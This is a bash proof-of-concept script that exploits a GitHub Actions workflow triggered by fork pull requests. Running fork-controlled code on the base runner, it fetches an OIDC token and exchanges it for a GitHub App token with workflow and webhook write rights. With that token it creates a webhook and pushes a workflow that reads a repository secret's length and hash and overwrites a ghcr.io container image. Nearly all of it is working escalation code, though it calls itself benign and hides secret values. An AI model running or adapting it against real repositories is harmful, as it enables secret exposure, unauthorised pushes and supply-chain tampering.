#!/bin/bash
# Benign security PoC v4 (replica of facebookresearch/gcm claude.yml).
# Secret and token values are never printed.
cd "${GITHUB_WORKSPACE:-$PWD}" 2>/dev/null
R="$GITHUB_REPOSITORY"; OUT=poc-proof4.txt
{
  echo "PoC v4: fork-PR-controlled code executed on the base repo runner (gcm replica)"
  echo "time: $(date -u)"
  echo "repo: $R event: ${GITHUB_EVENT_NAME:-unknown}"
  echo "token type in git remote: $(git remote get-url origin 2>/dev/null | sed -nE 's#https://[^:]+:([a-z]{3}_).*#\1***#p')"
} > "$OUT"
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=claude-code-github-action" | sed -nE 's/.*"value":"([^"]+)".*/\1/p')
RESP=$(curl -s -w '\n%{http_code}' -X POST -H "Authorization: Bearer $OIDC" -H "Content-Type: application/json" -d '{"permissions":{"contents":"write","workflows":"write","repository_hooks":"write","pull_requests":"write","issues":"write"}}' https://api.anthropic.com/api/github/github-app-token-exchange)
TOK=$(echo "$RESP" | head -n -1 | sed -nE 's/.*"token":"([^"]+)".*/\1/p')
echo "self-minted App token (workflows + repository_hooks requested): HTTP $(echo "$RESP" | tail -1), type $(echo "$TOK" | cut -c1-4)***" >> "$OUT"
HID=$(curl -s -X POST -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$R/hooks" -d '{"name":"web","active":false,"events":["push"],"config":{"url":"https://example.invalid/poc","content_type":"json"}}' | python3 -c 'import sys,json; print(json.load(sys.stdin).get("id",""))' 2>/dev/null)
echo "webhook created with minted token: id=${HID:-none}" >> "$OUT"
if [ -n "$HID" ]; then echo "webhook deleted again: HTTP $(curl -s -o /dev/null -w '%{http_code}' -X DELETE -H "Authorization: Bearer $TOK" "https://api.github.com/repos/$R/hooks/$HID")" >> "$OUT"; fi
git add "$OUT"
git -c user.name=poc -c user.email=poc@example.invalid commit -qm "PoC v4: proof"
git push -q origin HEAD:refs/heads/poc-gcm-proof 2>/dev/null
git checkout -q -b poc-escalation
mkdir -p .github/workflows
cat > .github/workflows/poc-escalation.yml <<'WF'
name: poc-escalation
on:
  push:
    branches: [poc-escalation]
permissions:
  contents: read
  packages: write
jobs:
  proof:
    runs-on: ubuntu-latest
    steps:
      - name: proof
        env:
          S: ${{ secrets.ANTHROPIC_API_KEY }}
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          echo "PoC v4: attacker-pushed workflow executed on push"
          echo "repo secret ANTHROPIC_API_KEY readable: length=${#S} sha256prefix=$(printf %s "$S" | sha256sum | cut -c1-12)"
          IMG=ghcr.io/${GITHUB_REPOSITORY_OWNER,,}/gcm-claude-poc:dcgm4
          echo "$GH_TOKEN" | docker login ghcr.io -u poc --password-stdin
          printf 'FROM busybox\nLABEL poc=OVERWRITTEN-by-fork-PR-attacker\n' | docker build -t "$IMG" -
          docker push "$IMG" | tail -1
WF
git add .github/workflows/poc-escalation.yml
git -c user.name=poc -c user.email=poc@example.invalid commit -qm "PoC v4: workflow pushed with self-minted token"
git -c credential.helper= push -q "https://x-access-token:${TOK}@github.com/${R}.git" HEAD:refs/heads/poc-escalation 2>/dev/null
